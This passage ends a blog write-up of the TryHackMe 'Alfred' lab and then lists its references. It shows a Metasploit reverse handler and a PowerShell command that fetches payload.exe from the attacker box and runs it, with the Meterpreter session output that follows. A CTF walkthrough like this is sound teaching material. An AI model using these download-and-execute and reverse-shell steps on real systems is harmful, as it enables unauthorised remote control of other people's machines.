markup--pre-strong">msf5 exploit(multi/handler) &gt; set LPORT 4445</strong><br>LPORT =&gt; 4445<br><strong class="markup--strong markup--pre-strong">msf5 exploit(multi/handler) &gt; exploit</strong></pre><pre name="e093" id="e093" class="graf graf--pre graf-after--pre">[*] Started reverse TCP handler on 10.9.6.135:4445</pre><p name="8d3b" id="8d3b" class="graf graf--p graf-after--pre">On the boot2root shell, I downloaded and executed the <code class="markup--code markup--p-code">payload.exe</code> file:</p><pre name="cb5c" id="cb5c" class="graf graf--pre graf-after--p"><strong class="markup--strong markup--pre-strong">PS C:\&gt; cd C:\\Users\\bruce\\Desktop\\</strong><br><strong class="markup--strong markup--pre-strong">PS C:\Users\bruce\Desktop&gt; powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://&lt;attackbox ip&gt;:8888/payload.exe&#39;,&#39;payload.exe&#39;)&quot;</strong><br><strong class="markup--strong markup--pre-strong">PS C:\Users\bruce\Desktop&gt; ls</strong></pre><pre name="9dfa" id="9dfa" class="graf graf--pre graf-after--pre">Directory: C:\Users\bruce\Desktop</pre><pre name="31ba" id="31ba" class="graf graf--pre graf-after--pre">Mode                LastWriteTime     Length Name                              <br>----                -------------     ------ ----                              <br>-a---                  [redacted]      73802 payload.exe                       <br>-a---        10/25/2019  11:22 PM         32 user.txt</pre><pre name="2c8b" id="2c8b" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">PS C:\Users\bruce\Desktop&gt; Start-Process &quot;payload.exe&quot;</strong><br><strong class="markup--strong markup--pre-strong">PS C:\Users\bruce\Desktop&gt;</strong></pre><p name="9d0e" id="9d0e" class="graf graf--p graf-after--pre">And a reverse Meterpreter shell is initiated:</p><pre name="cf4e" id="cf4e" class="graf graf--pre graf-after--p">[*] Started reverse TCP handler on &lt;attackbox ip&gt;:4445 <br>[*] Sending stage (180291 bytes) to &lt;boot2root ip&gt;<br>[*] Meterpreter session 1 opened (&lt;attackbox ip&gt;:4445 -&gt; &lt;boot2root ip&gt;:49287) at [redacted] -0400</pre><pre name="340e" id="340e" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">meterpreter &gt;</strong></pre><p name="6157" id="6157" class="graf graf--p graf-after--pre">Allora.</p><h3 name="162c" id="162c" class="graf graf--h3 graf-after--p">References</h3><p name="7d61" id="7d61" class="graf graf--p graf-after--h3">Davis, H. (2021). <em class="markup--em markup--p-em">How do I run a shell command in Jenkins?</em> QuickAdviser. Retrieved on Mar. 20, 2022 from: <a href="https://quick-adviser.com/how-do-i-run-a-shell-command-in-jenkins/" data-href="https://quick-adviser.com/how-do-i-run-a-shell-command-in-jenkins/" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://quick-adviser.com/how-do-i-run-a-shell-command-in-jenkins/</a></p><p name="16b7" id="16b7" class="graf graf--p graf-after--p">Dobkins, M. P. (1999). <em class="markup--em markup--p-em">Me! Me! Me! (Season 1, Episode 3)</em> [TV Series Episode]. Archies Weird Mysteries. Link: <a href="https://www.youtube.com/watch?v=faGib7zY1rA" data-href="https://www.youtube.com/watch?v=faGib7zY1rA" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://www.youtube.com/watch?v=faGib7zY1rA</a></p><p name="7699" id="7699" class="graf graf--p graf-after--p">Hamilton, T. (2020). <em class="markup--em markup--p-em">How to Create a New Build Job in Jenkins Freestyle Project</em>. Guru99. Retrieved on Mar. 20, 2022 from: <a href="https://www.guru99.com/create-builds-jenkins-freestyle-project.html" data-href="https://www.guru99.com/create-builds-jenkins-freestyle-project.html" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://www.guru99.com/create-builds-jenkins-freestyle-project.html</a></p><p name="7032" id="7032" class="graf graf--p graf-after--p">Jenkins (n.d.). Retrieved on Mar. 22, 2022 from: <a href="https://www.jenkins.io/" data-href="https://www.jenkins.io/" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://www.jenkins.io/</a></p><p name="3ded" id="3ded" class="graf graf--p graf-after--p">Kennedy et al. (2021). <em class="markup--em markup--p-em">Access Tokens</em>. Microsoft Docs. Retrieved on Mar. 22, 2022 from: <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens" data-href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens</a></p><p name="0679" id="0679" class="graf graf--p graf-after--p">Mittal, N. and Mehlmauer, C. (n.d.). <em class="markup--em markup--p-em">Invoke-PowerShellTcp.ps1</em>. GitHub Repository. Retrieved on Mar. 20, 2022 from: <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" data-href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a></p><p name="055e" id="055e" class="graf graf--p graf--startsWithDoubleQuote graf-after--p graf--trailing">“tryhackme” (2019). <em class="markup--em markup--p-em">Alfred</em>. Retrieved on Mar. 22, 2022 from: <a href="https://tryhackme.com/room/alfred" data-href="https://tryhackme.com/room/alfred" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://tryhackme.com/room/alfred</a></p></div></div></section>
</section>
<footer><p>By <a href="https://medium.com/@EpsilonCalculus" class="p-author h-card">Aleksey</a> on <a href="https://medium.com/p/2ecd773aeda5"><time class="dt-published" datetime="2022-03-22T10:55:31.227Z">March 22, 2022</time></a>.</p><p><a href="https://medium.com/@EpsilonCalculus/tryhackme-writeup-alfred-2ecd773aeda5" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on June 14, 2022.</p></footer></article></body></html>